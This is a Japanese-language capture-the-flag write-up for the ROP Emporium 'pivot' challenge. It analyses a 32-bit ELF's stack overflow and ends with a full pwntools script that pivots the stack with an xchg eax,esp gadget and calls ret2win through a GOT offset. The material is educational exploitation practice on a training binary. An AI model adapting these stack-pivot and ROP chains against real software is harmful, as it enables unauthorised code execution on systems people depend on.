# pivot

## Description

There's only enough space for a small ROP chain on the stack,
but you've been given space to stash a much larger chain elsewhere.
Learn how to pivot the stack onto a new location.

Click below to download the binary:

[x86_64](https://ropemporium.com/binary/pivot.zip)[x86](https://ropemporium.com/binary/pivot32.zip)[ARMv5](https://ropemporium.com/binary/pivot_armv5.zip)[MIPS](https://ropemporium.com/binary/pivot_mipsel.zip)

### But why

To "stack pivot" just means to move the stack pointer elsewhere. It's a useful ROP technique and applies in cases where your initial chain is limited in size (as it is here) or you've been able to write a ROP chain elsewhere in memory (a heap spray perhaps) and need to "pivot" onto that new chain because you don't control the stack.

### There's more

In this challenge you'll also need to apply what you've previously learned about the `.plt` and `.got.plt` sections of ELF binaries. If you haven't already read [Appendix A](https://ropemporium.com/guide.html#Appendix A) in the Beginners' guide, this would be a good time.

**Important!**
This challenge imports a function named foothold_function() from a library that also contains a ret2win() function.

### Offset

The `ret2win()` function in the libpivot shared object isn't imported, but that doesn't mean you can't call it using ROP! You'll need to find the `.got.plt` entry of `foothold_function()` and add the offset of `ret2win()` to it to resolve its actual address. Notice that `foothold_function()` isn't called during normal program flow, you'll have to call it first to update its `.got.plt` entry.

### Count the ways

There are a few different ways you could approach this problem; printing functions like `puts()` can be used to leak values from the binary, after which execution could be redirected to the start of `main()` for example, where you're able to send a fresh ROP chain that contains an address calculated from the leak. Another solution could be to modify a `.got.plt` entry in-place using a write gadget, then calling the function whose entry you modified. You could also read a `.got.plt` entry into a register, modify it in-memory, then redirect execution to the address in that register.

Once you've solved this challenge by calling `ret2win()`, you can try applying the same principle to the libc shared object. Use one of the many pointers to libc code in the binary to resolve libc (there are more than just the `.got.plt` entries), then call `system()` with a pointer to your command string as its 1st argument, or use a one-gagdet. You can also go back and use this technique against challenges like "callme".

## Solution

なんかよくわからんけど、読み込めるところが少ないらしいから、

色々考えてやれってことらしい。

まぁ分からんけど表層解析するかぁぁぁ

```
✦ ❯ file pivot32 
pivot32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0c3486910b643fccda05edba0fd6529cfef16803, not stripped
✦ ❯ checksec --file=pivot32 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   77) Symbols	  No	0		3	pivot32
```

安定のnot canary found

これを見ると安心するね。（めんどくさいこと避けるなよ)

ほいじゃ、それぞれのコンテンツ漁っていくかぁ

```
✦ ❯ nm pivot32 
・・・
08048686 T main
         U malloc@@GLIBC_2.0
         U memset@@GLIBC_2.0
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
08048750 t pwnme
         U read@@GLIBC_2.0
0804882c t usefulGadgets
08048817 t uselessFunction
```

にょぉぉぉぉぉ

動的解析する

````
pivot by ROP Emporium
x86

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0xf7d29f10
Send a ROP chain now and it will land there
> fdsfsfs
Thank you!

Now please send your stack smash
> dfsf
Thank you!

Exiting

````

ret2win()なんてないんやが(は？)

```
mizuiro@mizuiro-arch ~/P/s/r/pivot32 (main)> nm libpivot32.so
...
0000077d T foothold_function
...
00000974 T ret2win
...
```

libpivot32にあった。

ありがたいことに二回入力させてくれるらしい（親切）

```
main(){
	eax = malloc()
	pwnme(eax)
}
```

```
pwnme(a){                      
	print(a)                      
	read(0,ebp+0x8,0x100)　
	read(0,ebp-0x28,0x38) 56文字入力できる
}                   　　　　　　　　　　　　
```

な感じだったので、二回目のreadにBuffer-Overflowの脆弱性があることがわかる。

しかしながら、今回は入力できる文字数が少ない。

そこでstack pivotというテクニックを使う。

stack pivotのテクニックを使うためのいい感じのROPガジェットがあった。

```
Gadgets information      
============================================================
0x0804882e : xchg eax, esp ; ret
0x0804882c : pop eax ; ret
```

espをmallocで確保した領域(一度目入力した範囲）に移動してあげればいい。



さて、ret2winを実行させればいいわけだが、pwnmeに```call ret2win```はないので他のライブラリの関数を呼んで、そこからのオフセットで起動させることを考える。

```
00000974 <ret2win>:
0000077d <foothold_function>:
```

```
gef➤  p/x 0x00000974-0x0000077d
$3 = 0x1f7
```

GOTのアドレスはPLTから実際に関数が呼ばれるまで、定まらない。

この仕組みをlazy bidingと言うらしい。

詳しい話は[こちら](https://ropemporium.com/guide.html#Appendix%20A)に載っている

さて、そうなるとfoothold_functionのGOT.PLTのアドレスと

.PLTでのアドレスを使わなければならない。

```
mizuiro@mizuiro-arch ~/P/s/r/pivot32 (main)> readelf -r ./pivot32

Relocation section '.rel.dyn' at offset 0x428 contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  00000606 R_386_GLOB_DAT    00000000   __gmon_start__
0804a03c  00000e05 R_386_COPY        0804a03c   stdout@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x438 contains 10 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a014  00000307 R_386_JUMP_SLOT   00000000   free@GLIBC_2.0
0804a018  00000407 R_386_JUMP_SLOT   00000000   malloc@GLIBC_2.0
0804a01c  00000507 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
0804a020  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
0804a024  00000807 R_386_JUMP_SLOT   00000000   foothold_function
0804a028  00000907 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a02c  00000a07 R_386_JUMP_SLOT   00000000   setvbuf@GLIBC_2.0
0804a030  00000b07 R_386_JUMP_SLOT   00000000   memset@GLIBC_2.0
```



```
08048520 <foothold_function@plt>:
 8048520:       ff 25 24 a0 04 08       jmp    DWORD PTR ds:0x804a024
 8048526:       68 30 00 00 00          push   0x30
 804852b:       e9 80 ff ff ff          jmp    80484b0 <.plt>
```



```
foothold_got = 0804a024
foothold_plt = 08048520
```



一回、footholdを呼んで、そのあとに、footholdのgotのアドレスを読み込んでそこからのオフセットでret2winを呼ぶ



```python
from pwn import *

BINARY = './pivot32'

context.binary = BINARY
context.os = 'linux'
context.arch = 'i386'

binary = ELF(BINARY)
lib = ELF("libpivot32.so")

binary_rop = ROP(binary)
#address
foothold_plt = 0x08048520   # binary.symbols.plt['foothold_function'] # 0x08048520  ;objdump -d ./pivot32 | sed -n '/<uselessFunction>:/,/^$/p
foothold_got = 0x0804a024   # binary.symbols.got['foothold_function'] # 0x0804a024  ;readelf -r ./pivot32 | grep foothold
assert 0x08048520 == foothold_plt
assert 0x0804a024 == foothold_got
print("foothold_got:",hex(foothold_got))
#gadget
xchg_eax_esp = 0x0804882e   # 0x0804882e: xchg eax, esp; ret;
pop_eax = 0x0804882c        # 0x0804882c : pop eax ; ret
assert pop_eax == 0x0804882c
mov_eax = 0x08048830        # 0x08048830: mov eax, dword ptr [eax] ; ret
call_eax = 0x080485f0       # 0x080485f0: call eax;
add_eax_ebx = 0x08048833    # 0x08048833: add eax, ebx ; ret
pop_ebx = 0x080484a9        # 0x080484a9 : pop ebx ; ret
#offset
offset_ret2win_from_gtplt = lib.symbols['ret2win'] - lib.symbols['foothold_function']
foothold_offset = 0x77d     # objdump -d ./libpivot32.so | grep ret2win
ret2win_offset = 0x974      # objdump -d ./libpivot32.so | grep foothold_function

assert offset_ret2win_from_gtplt == ret2win_offset-foothold_offset

def first_input():
    rop = p32(foothold_plt)
    rop += p32(pop_eax)
    rop += p32(foothold_got) #アドレスを移動させなければいけない
    rop += p32(mov_eax)
    rop += p32(pop_ebx)
    rop += p32(offset_ret2win_from_gtplt)
    rop += p32(add_eax_ebx)
    rop += p32(call_eax)
    return rop
def second_input(pivot):
    rop = b"A"*44
    rop += p32(pop_eax)
    rop += p32(int(pivot,16))
    rop += p32(xchg_eax_esp)
    return rop
def info():
    log.info('foothold_offset: %#x' % foothold_offset)
    log.info('ret2win_offset: %#x' % ret2win_offset)

p = process(BINARY)
raw_input(str(p.proc.pid)) #for gdb attach (gdb -p <pid>)
p.recvuntil(b'place to pivot: ')
pivot = p.recvline().strip().decode()
log.info(f'pivot: {pivot}')
p.sendlineafter('> ',first_input())
p.sendlineafter('> ',second_input(pivot))

recv = p.recvall()
log.info(f'recv: {recv}')
# # write data to file
# with open("input", "wb") as f:
#     f.write(rop)
```

